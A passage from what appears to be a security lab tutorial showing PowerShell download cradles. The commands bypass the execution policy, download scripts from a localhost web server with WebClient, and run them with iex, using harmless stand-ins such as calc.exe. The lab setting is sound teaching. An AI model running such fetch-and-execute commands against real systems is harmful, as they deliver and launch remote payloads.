for the downloaded scripts for this and future examples for ease of use. Attackers would choose a more covert location on the hard drive in an actual attack.

+   i. Put just the word **date** in a file called script4.ps1, in the www directory, and run the following command, which uses the **DownloadFile** function instead of the **DownloadString** function we’ve been using thus far:

```
powershell.exe -ExecutionPolicy Bypass -NoExit (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/script4.ps1',
'C:\Users\%USERNAME%\Desktop\script4.ps1'); iex
'C:\Users\%USERNAME%\Desktop\script4.ps1'
```

+   j. Now put these two lines in script5.ps1:

```
Copy-Item "C:\Windows\System32\calc.exe"
"C:\Users\$env:USERNAME\Desktop"
& "C:\Windows\System32\calc.exe"
```

The **Copy-Item** cmdlet copies from a source location to a destination location. In this case, we’re copying the Calculator program from C:\Windows\System32 to the current user’s desktop. The desktop location has been chosen for ease of use. Adversaries would choose a more covert location on the hard drive in an actual attack. Notice that the **%USERNAME%** reference used before has been changed to the PowerShell format, since the variable is being used within a PowerShell script this time.

The call operator, **&**, executes the command to launch Calculator.

Run the following command, and just imagine that calc.exe was an actual malware specimen ready to launch at an attacker’s whim!

```
powershell.exe -ExecutionPolicy Bypass -NoExit (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/script5.ps1',
'C:\Users\%USERNAME%\Desktop\script5.ps1'); iex
'C:\Users\%USERNAME%\Desktop\script5.ps1'
```

+   k. Put the following in script6.ps1:

```
& "C:\Program Files\Google\Chrome\Application\chrome.exe"
www.rit.edu/directory/jswics-jonathan-weissman
```

Depending on when you installed Chrome, chrome.exe might be